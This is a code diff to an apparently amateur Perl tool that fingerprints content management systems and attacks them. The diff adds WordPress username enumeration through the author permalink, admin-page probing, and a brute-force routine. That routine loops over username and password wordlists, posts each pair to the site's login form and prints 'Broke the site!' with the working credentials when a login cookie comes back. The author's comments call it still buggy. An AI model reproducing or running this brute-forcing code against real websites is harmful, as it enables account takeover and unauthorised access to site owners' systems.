@@ -11,7 +11,7 @@ use HTTP::Request::Common;
 use HTTP::Cookies;
 use LWP::Protocol::https;
 use Term::ANSIColor;
-use Getopt::Long qw(:config bundling);
+use Getopt::Long;
 #-- Turns off warnings for uninitialized values
 no warnings 'uninitialized';
 #-----------------------
@@ -31,7 +31,7 @@ EOB
 
 #-----------------------
 #-- Global variables
-my ($help, $cms, $guess, $brute, $plugins, $target, $user, $server, $ulist, $plist);
+my ($help, $cms, $guess, $brute, $plugins, $target, $user, $server, $ulist, $plist, $admin);
 #-- Options to be used in the command line and their associated variables
 #-- *=s sets the variable as a string
 GetOptions(
@@ -45,6 +45,7 @@ GetOptions(
   "s|server"      =>  \$server,
   "ul|ulist=s"    =>  \$ulist,
   "pl|plist=s"    =>  \$plist,
+  "a|admin"       =>  \$admin,
 );
 
 #-- Bot building for things
@@ -82,6 +83,7 @@ if ($help ne ''){
   }
 }
 
+#-- Currently debugging, broken af.. somehow, I'm not too sure
 if ($brute){
   if($ulist eq '' || $plist eq ''){
     help();
@@ -93,8 +95,6 @@ if ($brute){
     exit(0);
   }
 }
-
-
 
 if ($target eq ''){
   help();
@@ -117,23 +117,47 @@ if (($cms eq '') && ($guess eq '')){
 }
 #-- END of variable check
 #-----------------------
+#-- Running stuff
+if ($server){
+  server_find();
+}
+if (($user) && ($cms =~ /wordpress/i)){
+  wp_user();
+} elsif (($user) && ($cms !~ /wordpress/i)){
+  print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
+  print color('bold red'), "[*] Incompatible CMS\n", color('reset');
+  print color('bold red'), "[*] Skipping user scraping\n", color('reset');
+  print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
+}
+
+#-----------------------
 #-- Changelog
 sub changelog {
 print q(
 
 +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
-CURRENT VERSION: 0.0.5
+CURRENT VERSION: 0.0.6
+
 Changes made:
 
-Version 0.0.5 - Bug fixes
+Version 0.0.6 -
+Added WordPress brute forcing, minor bug fixes, removed the bundling configuration,
+began intitial testing
 
-Version 0.0.4 - Bug fixes and additional minor features added
+Version 0.0.5 -
+Bug fixes
 
-Version 0.0.3 - Added the functionality for CMS finger printing and admin page finding
+Version 0.0.4 -
+Bug fixes and additional minor features added
 
-Version 0.0.2 - Basic functionality added
+Version 0.0.3 -
+Added the functionality for CMS finger printing and admin page finding
 
-Version 0.0.1 - Basic structure and design
+Version 0.0.2 -
+Basic functionality added
+
+Version 0.0.1 -
+Basic structure and design
 +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
 );
 
@@ -158,6 +182,7 @@ sub help {
   OPTIONS:
 
   h|help      =>  Help menu
+  a|admin     =>  Admin page finding
   c|cms       =>  Tells the CMS that is being targeted (reuired if -g is not being used)
   g|guess     =>  Attempts to guess target CMS
   b|brute     =>  Attempts to find an brute force the login page
@@ -167,7 +192,7 @@ sub help {
   s|server    =>  Attempts to find the server daemon
   ul|ulist    =>  Provide a list of usernames (required if -b is in use)
   pl|plist    =>  Provide a list of passwords (required if -b is in use)
-  change      =>  Print the Changelog
+  ex|exploit  =>  Attempt to reach exploit-db and gather a list of exploits (I'll get around to this at somepoint)
 
 );
   print color('reset');
@@ -249,7 +274,7 @@ sub admin_find {
       print color('bright_red'), "[*] Unable to get to the admin page!\n", color('reset');
       }
     }
-  elsif($cms =~ /joomla|joomla!/gi) {
+  elsif($cms =~ /drupal/gi) {
     $admin = $bot->get($target.$drupal_admin);
     if ($bot->is_success){
       print color('bright_cyan'), "[*] Able to get to the admin page!\n", color('reset');
@@ -261,19 +286,78 @@ sub admin_find {
   }
 }
 
-#-- Scrapes the username from the author permalink
+#-- Scrapes the username from the author permalink (WordPress only)
 sub wp_user {
   $user = $target."/?author=1";
   my $req = HTTP::Request ->new(GET=>$user);
   my $userhunt = $bot->request($req)->content;
   if($userhunt =~/author\/(.*?)\//){
     my $victim = $1;
-    return $victim;
+    print $victim;
+    if ($brute){
+      wp_brute($victim);
+    }
   }
 }
 
 #-- Narrowed brute forcing subroutines
-sub wp_brute {}
+sub wp_brute {
+  #-- Optional test to see if the admin page is accessible
+  if ($admin){
+    admin_find();
+  }
+  my $victim = shift;
+  if ($victim){
+    print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
+    print color('bright_cyan'), "[*] Using user $victim\n";
+    print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
+
+    open my $pass_handle, '<', $plist;
+    chomp(my @pass = <$pass_handle>);
+    close $pass_handle;
+
+    foreach (@pass) {
+        chomp(my $passwd = $_);
+          my $host = $target . '/wp-login.php';
+          my $auth = $target . '/wp-admin/';
+          my $login = POST $target,[log => $victim, pwd => $passwd, wpsubmit=> 'Log In', redirect_to => $auth];
+          my $attempt = $bot->request($login);
+          my $status = $attempt-> as_string;
+          if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){  color('bold green');
+            print "[*]Broke the site!\n";
+            print "[*] =>\t$victim \n";
+            print "[*] =>\t$passwd \n";
+            print color('reset');
+          }
+        }
+      }
+  if ($user eq ''){
+    open my $user_handle, '<', $ulist;
+    chomp(my @users = <$user_handle>);
+    close $user_handle;
+    open my $pass_handle, '<', $plist;
+    chomp(my @pass = <$pass_handle>);
+    close $pass_handle;
+
+    foreach (@users) {
+      chomp(my $users = $_);
+        foreach (@pass) {
+          chomp(my $passwd = $_);
+          my $host = $target . '/wp-login.php';
+          my $auth = $target . '/wp-admin/';
+          my $login = POST $target,[log => $users, pwd => $passwd, wpsubmit=> 'Log In', redirect_to => $auth];
+          my $attempt = $bot->request($login);
+          my $status = $attempt-> as_string;
+          if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){  color('bold green');
+            print "[*]Broke the site!\n";
+            print "[*] =>\t$users \n";
+            print "[*] =>\t$passwd \n";
+            print color('reset');
+        }
+      }
+    }
+  }
+}
 
 sub joomla_brute {}
 
